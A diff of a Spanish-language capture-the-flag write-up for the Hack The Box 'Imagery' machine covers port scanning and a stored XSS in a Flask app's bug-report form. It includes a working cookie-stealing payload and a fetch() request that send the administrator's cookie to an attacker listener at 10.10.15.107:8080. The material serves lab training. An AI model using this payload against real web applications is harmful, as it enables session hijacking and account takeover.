@@ -13,14 +13,18 @@ categories:
   - infosec
 tags:
   - linux
+  - XSS
+  - LFI
 ---
 
-Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador.
+Imagery aloja una aplicación de galería de imágenes basada en Flask. Explotaremos una vulnerabilidad de XSS persistente (stored XSS) en la función de reporte de errores para robar una cookie de administrador. Por medio de la función de obtener los logs filtraremos in local file inclusion para obtener el código fuente de la aplicación donde finalmente haremos una inyección de comandos en la función que transforma o edita las imágenes.
 
-# 1. Enumeracion
+# 1. Enumeración y Reconocimiento
 
-Con `nmap` buscaremos los puertos abiertos para escanear los servicios que le alojan en ellos.
+Iniciamos con una fase de reconocimiento activo utilizando nmap para identificar la superficie de ataque. El objetivo es descubrir servicios en ejecución y versiones específicas que puedan presentar debilidades.
 
+## 1.1 Escaneo de todos los puertos (Full Port Scan)
+Ejecutamos un escaneo inicial sobre el rango completo de puertos TCP (1-65535) para asegurar que no pasamos por alto ningún servicio oculto en puertos no estándar.
 ```
 nmap -p- -vvv --min-rate 5000 10.129.242.164
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:46 -05
@@ -38,7 +42,11 @@ Not shown: 65465 filtered tcp ports (no-response)
 PORT      STATE  SERVICE          REASON
 22/tcp    open   ssh              syn-ack
 8000/tcp  open   http-alt         syn-ack ttl 63
+```
+## 1.2 Detección de Servicios y Versiones
+Una vez identificados los puertos abiertos, realizamos un escaneo más profundo utilizando los flags -sC (scripts por defecto) y -sV (detección de versiones).
 
+```
 nmap -p 22,8000 -sCV 10.129.242.164
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-19 14:53 -05
 Nmap scan report for imagery.htb (10.129.242.164)
@@ -53,7 +61,11 @@ PORT     STATE SERVICE  VERSION
 |_http-server-header: Werkzeug/3.1.3 Python/3.12.7
 ```
 
-El browser busca la IP registrada en el archivo local `/etc/hosts` y si no la encuentra busca en el servidor DNS, para eso agregamos la IP de la maquina en este archivo. 
+## 1.3 Configuración del Virtual Host
+
+Dado que el servidor web puede estar configurado para responder a un nombre de dominio específico, es necesario mapear la dirección IP de la instancia al nombre de dominio imagery.htb. Esto permite que el navegador (o herramientas como curl) envíe el encabezado HTTP Host correcto.
+
+Modificamos el archivo `/etc/hosts` de nuestro sistema atacante:
 
 ```
 echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
@@ -61,41 +73,47 @@ echo "10.129.243.164 imagery.htb" | sudo tee -a /etc/hosts
 
 ![](/assets/images/htb-writeup-imagery/home.png)
 
-Despues de navegar por las diferentes rutas, nos registramos en `http://imagery.htb:8000/register` y e ingresamos `http://imagery.htb:8000/login`
+## 1.4 Análisis de la Aplicación Web
+Al acceder a `http://imagery.htb:8000`, nos encontramos con una plataforma de gestión de imágenes. Para interactuar con las funciones internas de la aplicación, procedemos a crear una cuenta de usuario.
+
+- **Registro**: Navegamos al endpoint `/register` para crear un nuevo perfil.
+- **Autenticación**: Una vez registrados, iniciamos sesión en el panel de `/login`
 
 # 2. Explotacion
 
-## 2.1 Cross-Site Scripting (XSS)
+## 2.1 Cross-Site Scripting (XSS) persistente
 
-Notamos que el formulario de tipo text area de la ruta `http://imagery.htb:8000/admin/bug_reports` es vulnerable a XSS el cual aprovecharemos para inyectar HTML y obtener la cookie del administrador. Una vez el admistrador atienda los reportes obtendremos su cookie de sesion.
+Durante la auditoría del panel de usuario, identificamos que el formulario en la ruta `/admin/bug_reports` no sanitiza correctamente la entrada del campo **Bug Details**. Al ser un reporte que será visualizado por un usuario con privilegios elevados (administrador), esto representa un vector de **Stored XSS**.
 
-Para eso desde nuentra maquina levantaremos en escucha un servidor en el puerto `8080`.
+Para explotar esta vulnerabilidad y obtener la cookie de sesión del administrador, preparamos un servidor de escucha en nuestra máquina local:
 
 ```
 python -m http.server 8080
 ```
-Enviaremos como parametro el siguiente HTML formulario Bug Details.
+Posteriormente, enviamos un reporte de error inyectando un payload diseñado para forzar al navegador de la víctima a redirigirse a nuestro servidor, adjuntando sus cookies en la URL:
+
+**Payload inyectado**:
 
 ```html
 <img src=/ onerror="document.location='http://{ip_atacante}:8080/'+document.cookie" />
 ```
 
-Si obtenemos el fetch  que envia el navegador, el payload final quedaria asi: 
+Para automatizar o replicar esta acción, podemos interceptar la petición y utilizar el siguiente fetch desde la consola del navegador:
 
 ```js
 await fetch("http://imagery.htb:8000/report_bug", {
-    "credentials": "include",
-    "headers": {
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Content-Type": "application/json",
-    },
-    "body": "{\"bugName\":\"test bug report\",\"bugDetails\":\"<img src=/ onerror=\\\"document.location='http://10.10.15.107:8080/'+document.cookie\\\">\"}",
     "method": "POST",
-    "mode": "cors"
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "body": JSON.stringify({
+        "bugName": "Critical UI Bug",
+        "bugDetails": "<img src=/ onerror=\"document.location='http://10.10.15.107:8080/'+document.cookie\">"
+    })
 });
 ```
-Cuando el administrador entre a ver el reporte, sera redirigido al host del atacante donde podra ver la su cookie de session.
+
+Una vez que el administrador accede al reporte para revisarlo, su navegador ejecuta el código malicioso. Recibimos la siguiente petición en nuestro servidor:
 
 ```
 python -m http.server 8080
@@ -108,7 +126,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 Al no tener la flag `HttpOnly` incluida en el encabezado `HTTP Set-Cookie` deja a la aplicación expuesta a ataques de **Cross-Site Scripting (XSS)** y secuestro de sesión. 
 
-En consecuencia podremos entrar como administradores y seguir entendiendo como funciona esta APP Web. 
+Con esta cookie, procedemos a suplantar la identidad del administrador en el navegador para acceder a funciones restringidas. 
 
 ### 2.1.1 Secuestro de sesion
 
